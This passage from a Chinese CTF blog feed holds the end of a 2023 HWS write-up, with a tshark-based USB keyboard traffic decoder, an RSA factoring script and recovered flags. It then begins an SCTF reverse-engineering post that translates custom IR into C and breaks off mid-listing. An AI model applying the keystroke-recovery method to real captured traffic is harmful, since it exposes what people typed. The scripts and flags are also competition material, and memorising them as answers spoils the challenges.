class="line">                <span class="comment">#     formatfile.writelines(data+"\n")</span></span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(i.strip(<span class="string">"\n"</span>)) == <span class="number">16</span>:</span><br><span class="line">                    Bytes = [i[j:j + <span class="number">2</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(i.strip(<span class="string">"\n"</span>)), <span class="number">2</span>)]</span><br><span class="line">                    data = <span class="string">":"</span>.join(Bytes)</span><br><span class="line">                    formatfile.writelines(data + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">        formatfile.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">jiemi</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"\n-----开始解密Tshark导出的键盘数据-----\n"</span>)</span><br><span class="line">        <span class="comment"># 读取数据 z</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">"formatKbdatafile.txt"</span>, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                self.presses.append(line[<span class="number">0</span>:-<span class="number">1</span>])  <span class="comment"># 去掉末尾的 \n</span></span><br><span class="line">        <span class="comment"># 开始处理</span></span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> press <span class="keyword">in</span> self.presses:</span><br><span class="line">            <span class="keyword">if</span> press == <span class="string">''</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="comment"># thark 版本原因，导出数据格式不同</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">':'</span> <span class="keyword">in</span> press:</span><br><span class="line">                Bytes = press.split(<span class="string">":"</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 两两分组</span></span><br><span class="line">                Bytes = [press[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(press), <span class="number">2</span>)]</span><br><span class="line">                <span class="built_in">print</span>(Bytes)</span><br><span class="line">            <span class="keyword">if</span> Bytes[<span class="number">0</span>] == <span class="string">"00"</span>:</span><br><span class="line">                <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">"00"</span> <span class="keyword">and</span> self.normalKeys.get(Bytes[<span class="number">2</span>]):</span><br><span class="line">                    result.append(self.normalKeys[Bytes[<span class="number">2</span>]])</span><br><span class="line">                    <span class="comment"># print(result)</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="built_in">int</span>(Bytes[<span class="number">0</span>], <span class="number">16</span>) &amp; <span class="number">0b10</span> <span class="keyword">or</span> <span class="built_in">int</span>(Bytes[<span class="number">0</span>], <span class="number">16</span>) &amp; <span class="number">0b100000</span>:  <span class="comment"># shift key is pressed.</span></span><br><span class="line">                <span class="keyword">if</span> Bytes[<span class="number">2</span>] != <span class="string">"00"</span> <span class="keyword">and</span> self.normalKeys.get(Bytes[<span class="number">2</span>]):</span><br><span class="line">                    <span class="comment"># result.append(self.normalKeys[Bytes[2]])</span></span><br><span class="line">                    result.append(self.shiftKeys[Bytes[<span class="number">2</span>]])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">"[-] Unknow Key : %s"</span> % (Bytes[<span class="number">0</span>]))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">"[+] USB_Found : %s"</span> % (result))</span><br><span class="line">        <span class="comment"># print(type(result))</span></span><br><span class="line"></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                a = result.index(<span class="string">'&lt;DEL&gt;'</span>)</span><br><span class="line">                <span class="keyword">del</span> result[a]</span><br><span class="line">                <span class="keyword">del</span> result[a - <span class="number">1</span>]</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> result[i] == <span class="string">"&lt;CAP&gt;"</span>:</span><br><span class="line">                    flag += <span class="number">1</span></span><br><span class="line">                    result.pop(i)</span><br><span class="line">                    <span class="keyword">if</span> flag == <span class="number">2</span>:</span><br><span class="line">                        flag = <span class="number">0</span></span><br><span class="line">                <span class="keyword">if</span> flag != <span class="number">0</span>:</span><br><span class="line">                    result[i] = result[i].upper()</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># print ('\n [+] 键盘数据 output :' + "".join (result))</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 删除提取数据文件</span></span><br><span class="line">        rm_stat = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">f"-----是否删除tshark导出的文件 \"<span class="subst">{self.datafile}</span>\", 1 or 0-----\n"</span>))</span><br><span class="line">        <span class="keyword">if</span> rm_stat == <span class="number">1</span>:</span><br><span class="line">            os.remove(self.datafile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    <span class="comment"># 我的 vscode 工作区的原因，需要切换到当前目录</span></span><br><span class="line">    pwd = os.path.dirname(__file__)</span><br><span class="line">    os.chdir(pwd)</span><br><span class="line"></span><br><span class="line">    BANNER = <span class="string">r"""                                                                                                                                </span></span><br><span class="line"><span class="string">    //   / / //   ) )  //   ) )                                           </span></span><br><span class="line"><span class="string">   //   / / ((        //___/ /   ___      __      ___      ___     / ___  </span></span><br><span class="line"><span class="string">  //   / /    \\     / __  (   //   ) ) //  ) ) //   ) ) //   ) ) //\ \   </span></span><br><span class="line"><span class="string"> //   / /       ) ) //    ) ) //       //      //   / / //       //  \ \  </span></span><br><span class="line"><span class="string">((___/ / ((___ / / //____/ / ((____   //      ((___( ( ((____   //    \ \ </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                                                @MAY1AS</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="built_in">print</span>(BANNER)</span><br><span class="line"></span><br><span class="line">    argobject = argparse.ArgumentParser(prog=<span class="string">"UsbKbCracker"</span>, description=<span class="string">"""This is a script for decrypt UsbKeyboardData</span></span><br><span class="line"><span class="string">    """</span>)</span><br><span class="line"></span><br><span class="line">    argobject.add_argument(<span class="string">'-f'</span>, <span class="string">"--pcapfile"</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">"here is your capturedata file"</span>)</span><br><span class="line">    argobject.add_argument(<span class="string">'-e'</span>, <span class="string">"--fieldvalue"</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">"here is your output_format"</span>)</span><br><span class="line">    argobject.add_argument(<span class="string">'-Y'</span>, <span class="string">"--filterfield"</span>, <span class="built_in">help</span>=<span class="string">"here is your filter"</span>)</span><br><span class="line"></span><br><span class="line">    arg = argobject.parse_args()</span><br><span class="line"></span><br><span class="line">    kbparser = kbpaser()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># tshark 导出数据，存储在 usbdatafile.txt 内</span></span><br><span class="line">    kbparser.tshark_do(pcapfile=arg.pcapfile, fieldvalue=arg.fieldvalue, filterfield=arg.filterfield)</span><br><span class="line">    kbparser.formatkbdata()</span><br><span class="line">    kbparser.jiemi()</span><br></pre></td></tr></tbody></table></figure><p>使用脚本 - 进行解密，得出<code>Ao(mgHY$\A@Q7gW2D$dE@6#oO0f&lt;Gm1hAI'/N#4&lt;AN;MS@PfrQ149K</code></p><p><img src="/2023/07/20/2023HWS-WriteUp/image-20230720104155672.png" alt="image-20230720104155672"></p><p>使用随波逐流，base85解密得解</p><img src="/2023/07/20/2023HWS-WriteUp/image-20230717184002034.png" alt="image-20230717184002034" style="zoom:50%;"><p><code>flag{ec1b8b96-56a9-f15c-4e39-503e92ab45d2}</code></p><h1 id="crypto-rsa"><a href="#crypto-rsa" class="headerlink" title="crypto - rsa"></a>crypto - rsa</h1><p>这题和 AntCTF x D^3CTF 2022 的 d3factor 长的很像</p><p>使用脚本解密</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sagemath</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2,hashlib</span><br><span class="line"></span><br><span class="line">N=<span class="number">26989781630503676259502221325791347584607522857769579575297691973258919576768826427059198152035415835627885162613470528107575781277590981314410130242259476764500731263549070841939946410404214950861916808234008589966849302830389937977667872854316531408288338541977868568209278283760692866116947597445559763998608870359453835826711179703215320653445704522573070650642347871171425399227090705774976383452533375854187754721093890020986550939103071021619840797519979671188117673303672023522910200606134989916541289908538417562640981839074992935652363458747488201289997240226553340491203815779083605965873519144351105635977</span></span><br><span class="line">c=<span class="number">15608493359172313429111250362547316415137342033261379619116685637094829328864086722267534755459655689598026363165606700718051739433022581810982230521098576597484850535770518552787220173105513426779515790426303985414120033452747683669501078476628404455341179818932159581239994489678323564587149645006231756392148052557984581049067156468083162932334692086321511063682574943502393749684556026493316348892705114791740287823927634401828970155725090197482067045119003108806888768161101755244340832271562849138340706213702438667804460812804485276133545408754720942940596865774516864097546006862891145251661268265204662316437</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">e1=<span class="number">8334176273377687778925968652923982846998724107624538105654894737480608040787164942908664678429487595866375466955578536932646638608374859799560790357357355475153852315429988251406716837806949387421402107779526648346112857245251481791000156326311794515247012084479404963628187413781724893173183595037984078029706687141452980915897613598715166764006079337996939237831127877822777298891345240992224457502307777453813403723860370336259768714433691700008761598135158249554720239480856332237245140606893060889458298812027643186014638882487288529484407249417947342798261233371859439003556025622531286607093086262182961900221</span></span><br><span class="line">e2=<span class="number">22291783101991466901669802811072286361463259096412523019927956845014956726984633944311563809077545336731345629003968417408385538540199052480763352937138063001691494078141034164060073208592072783644252721127901996835233091410441838546235477819239598146496144359952946239328842198897348830164467799618269341456666825968971193729838026760012332020223490546511437879465268118749332615890600046622926159177680882780495663448654527562370133394251859961739946007037825763819500955365636946510343942994301809125029616066868596044885547005547390446468651797783520279531291808102209463733268922901056842903640261702268483580079</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="number">7</span></span><br><span class="line">a = (e2 - e1) * gmpy2.invert(e1*e2,N) % N</span><br><span class="line"><span class="comment"># assert a &lt; N</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">f = x - a</span><br><span class="line">x = f.small_roots(X = <span class="number">2</span>^<span class="number">1000</span>,beta = <span class="number">0.4</span>)</span><br><span class="line">x = x[<span class="number">0</span>] </span><br><span class="line">k_phi = e1*e2*x - (e2 - e1)</span><br><span class="line">p_ = gcd(k_phi,N)</span><br><span class="line"></span><br><span class="line">p = gmpy2.iroot(<span class="built_in">int</span>(p_),r - <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># print(p)</span></span><br><span class="line">q = N // (p**r)</span><br><span class="line"><span class="comment"># print(q)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)</span><br><span class="line"><span class="comment"># print(n)</span></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.decode(long_to_bytes(<span class="built_in">int</span>(m))))</span><br><span class="line"><span class="comment"># flag{RSA_1s_s0_ez_4nd_hwser_c4n_bre4k_1t!}</span></span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023SCTF-Syclang-中间指令IR分析</title>
      <link href="/2023/07/11/2023SCTF-Syclang-%E4%B8%AD%E9%97%B4%E6%8C%87%E4%BB%A4IR%E5%88%86%E6%9E%90/"/>
      <url>/2023/07/11/2023SCTF-Syclang-%E4%B8%AD%E9%97%B4%E6%8C%87%E4%BB%A4IR%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>题目给出了2个文件 – 程序AND中间指令</p><p>运行程序</p><p><img src="/2023/07/11/2023SCTF-Syclang-%E4%B8%AD%E9%97%B4%E6%8C%87%E4%BB%A4IR%E5%88%86%E6%9E%90/image-20230711111905108.png" alt="image-20230711111905108"></p><p>出题人写了一个简单的汇编器，查看另一个附件，其中有着800行的中间代码</p><p>不是特别多，可以手动翻译一下，主要就是赋值和循环</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//声明一个结构体</span></span><br><span class="line">STRUCT <span class="built_in">exp</span> :</span><br><span class="line">  ARRAY .key(<span class="type">int</span>)[<span class="number">24</span>]&lt;+<span class="number">0</span>&gt;<span class="comment">//int类型，这里占8个字节，8*24=192</span></span><br><span class="line">  ARRAY .L(<span class="type">int</span>)[<span class="number">8</span>]&lt;+<span class="number">192</span>&gt;</span><br><span class="line">  ARRAY .R(<span class="type">int</span>)[<span class="number">8</span>]&lt;+<span class="number">256</span>&gt;</span><br><span class="line">  ARRAY .X(<span class="type">int</span>)[<span class="number">8</span>]&lt;+<span class="number">320</span>&gt;</span><br></pre></td></tr></tbody></table></figure><p>main函数</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">FUNCTION main - <span class="number">1640</span> :</span><br><span class="line">  ARRAY <span class="title function_">var11</span><span class="params">(<span class="type">char</span>)</span>[24]&lt;+0&gt;<span class="comment">//char类型占一个字节</span></span><br><span class="line">  STRUCT <span class="title function_">var22</span><span class="params">(<span class="built_in">exp</span>)</span>&lt;+488&gt;</span><br><span class="line">  STRUCT <span class="title function_">var23</span><span class="params">(<span class="built_in">exp</span>)</span>&lt;+872&gt;</span><br><span class="line">  STRUCT <span class="title function_">var24</span><span class="params">(<span class="built_in">exp</span>)</span>&lt;+1256&gt;</span><br><span class="line">  STRUCT <span class="title function_">var25</span><span class="params">(<span class="built_in">exp</span>)</span>&lt;+1640&gt;</span><br><span class="line">  ARG var11&lt;+24&gt;</span><br><span class="line">  temp1 := CALL read  <span class="comment">//调用函数，获取我们的flag</span></span><br><span class="line">  temp2 := #<span class="number">0</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp2</span><br></pre></td></tr></tbody></table></figure><p>第一个循环</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//第一个循环，运算1</span></span><br><span class="line">LABEL label4 :</span><br><span class="line">  temp4 := #<span class="number">24</span>  <span class="comment">//temp4=24  类似go语言的匿名变量</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &lt; temp4 GOTO label3  <span class="comment">//一个循环结构</span></span><br><span class="line">  GOTO label2</span><br><span class="line">LABEL label3 :</span><br><span class="line">  temp5 := #<span class="number">0</span></span><br><span class="line">  var12&lt;+<span class="number">32</span>&gt; := temp5</span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">1</span>}*{var16&lt;+<span class="number">64</span>&gt;}  <span class="comment">//这句就是将 某个变化的值赋值给一个临时的变量，理解为：tempa = var16 + 1 char类型就是一个字节</span></span><br><span class="line">  var12&lt;+<span class="number">32</span>&gt; ::= var11&lt;+<span class="number">1</span>&gt;&lt;+tempa&gt;  <span class="comment">//var12 = input[i]</span></span><br><span class="line">  temp6 := #<span class="number">23</span></span><br><span class="line">  temp7 := temp6 - var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := temp7</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;} <span class="comment">//创建临时变量</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt; := var12&lt;+<span class="number">32</span>&gt; </span><br><span class="line">      <span class="comment">//var22(@exp.key[0])&lt;+8&gt;&lt;+488&gt;获得exp结构体数组的起始地址，exp.key[23-i] = var12 = input[i]</span></span><br><span class="line">  temp3 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; + temp3</span><br><span class="line">  GOTO label4</span><br><span class="line"> </span><br><span class="line">.......<span class="comment">//其他代码</span></span><br></pre></td></tr></tbody></table></figure><p>转为C语言代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">24</span>; i++) {</span><br><span class="line">    var22.key[<span class="number">23</span> - i] = inputflag[i];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>第二个循环</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">//第二个循环，运算2</span></span><br><span class="line">LABEL label2 :</span><br><span class="line">  temp8 := #<span class="number">23</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := temp8</span><br><span class="line">LABEL label11 :</span><br><span class="line">  temp10 := #<span class="number">0</span></span><br><span class="line">  IF var15&lt;+<span class="number">56</span>&gt; &gt; temp10 GOTO label10 <span class="comment">//终止条件</span></span><br><span class="line">  GOTO label9</span><br><span class="line">LABEL label10 :</span><br><span class="line">  var18&lt;+<span class="number">80</span>&gt; := var15&lt;+<span class="number">56</span>&gt;</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var18&lt;+<span class="number">80</span>&gt;}</span><br><span class="line">  var19&lt;+<span class="number">88</span>&gt; := var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp11 := #<span class="number">1</span></span><br><span class="line">  temp12 := var15&lt;+<span class="number">56</span>&gt; - temp11  <span class="comment">// i-1</span></span><br><span class="line">  var16&lt;+<span class="number">64</span>&gt; := temp12</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var16&lt;+<span class="number">64</span>&gt;}</span><br><span class="line">  var17&lt;+<span class="number">72</span>&gt; := var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt;</span><br><span class="line">  temp13 := var19&lt;+<span class="number">88</span>&gt; - var17&lt;+<span class="number">72</span>&gt;</span><br><span class="line">  var21&lt;+<span class="number">104</span>&gt; := temp13</span><br><span class="line">#!tempa := {#<span class="number">8</span>}*{var15&lt;+<span class="number">56</span>&gt;} <span class="comment">//i</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.key[<span class="number">0</span>])&lt;+<span class="number">8</span>&gt;&lt;+<span class="number">488</span>&gt;&lt;+tempa&gt; := var21&lt;+<span class="number">104</span>&gt;  <span class="comment">// exp.key[i] =exp.key[i] - exp.key[i-1]</span></span><br><span class="line">  temp9 := #<span class="number">1</span></span><br><span class="line">  var15&lt;+<span class="number">56</span>&gt; := var15&lt;+<span class="number">56</span>&gt; - temp9</span><br><span class="line">  GOTO label11</span><br></pre></td></tr></tbody></table></figure><p>转为C语言代码</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">23</span>; i &gt; <span class="number">0</span>; i--) {</span><br><span class="line">    var22.key[i] = var22.key[i] - var22.key[i - <span class="number">1</span>];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>赋值区/初始化</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">LABEL label9 :</span><br><span class="line">  temp15 := #<span class="number">0</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.L[<span class="number">0</span>])&lt;+<span class="number">200</span>&gt;&lt;+<span class="number">488</span>&gt; := temp15</span><br><span class="line">  temp17 := #<span class="number">8</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.R[<span class="number">0</span>])&lt;+<span class="number">264</span>&gt;&lt;+<span class="number">488</span>&gt; := temp17</span><br><span class="line">  temp19 := #<span class="number">11</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.X[<span class="number">0</span>])&lt;+<span class="number">328</span>&gt;&lt;+<span class="number">488</span>&gt; := temp19</span><br><span class="line">  temp21 := #<span class="number">15</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.L[<span class="number">1</span>])&lt;+<span class="number">208</span>&gt;&lt;+<span class="number">488</span>&gt; := temp21</span><br><span class="line">  temp23 := #<span class="number">23</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.R[<span class="number">1</span>])&lt;+<span class="number">272</span>&gt;&lt;+<span class="number">488</span>&gt; := temp23</span><br><span class="line">  temp25 := #<span class="number">0</span></span><br><span class="line">  temp26 := #<span class="number">13</span></span><br><span class="line">  temp27 := temp25 - temp26</span><br><span class="line">  var22(@<span class="built_in">exp</span>.X[<span class="number">1</span>])&lt;+<span class="number">336</span>&gt;&lt;+<span class="number">488</span>&gt; := temp27</span><br><span class="line">  temp29 := #<span class="number">2</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.L[<span class="number">2</span>])&lt;+<span class="number">216</span>&gt;&lt;+<span class="number">488</span>&gt; := temp29</span><br><span class="line">  temp31 := #<span class="number">11</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.R[<span class="number">2</span>])&lt;+<span class="number">280</span>&gt;&lt;+<span class="number">488</span>&gt; := temp31</span><br><span class="line">  temp33 := #<span class="number">17</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.X[<span class="number">2</span>])&lt;+<span class="number">344</span>&gt;&lt;+<span class="number">488</span>&gt; := temp33</span><br><span class="line">  temp35 := #<span class="number">10</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.L[<span class="number">3</span>])&lt;+<span class="number">224</span>&gt;&lt;+<span class="number">488</span>&gt; := temp35</span><br><span class="line">  temp37 := #<span class="number">20</span></span><br><span class="line">  var22(@<span class="built_in">exp</span>.R[<span class="number">3</span>])&lt;+<span class="number">288</span>&gt;&lt;+<span class="number">488</span>&gt; := temp37</span><br><span class="line">  temp39 := #<span class="number">0</span></span><br><span class="line">  temp40 := #<span class="number">19</span></span><br><span class="line">  temp41 := temp39 - temp40</span><br><span class="line">  var22(@<span class="built_in">exp</span>.X[<span class="number">3</span>])&lt;+<span class="number">352</span>&gt;&lt;+<span class="number">488</span>&gt; := temp41</span><br><span class="line">......</span><br></pre></td></tr></tbody></table></figure><p>以此类推，剩下的赋值与循环都是类似的</p><h2 id="中间指令解析"><a href="#中间指令解析" class="headerlink" title="中间指令解析"></a>中间指令解析</h2><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span 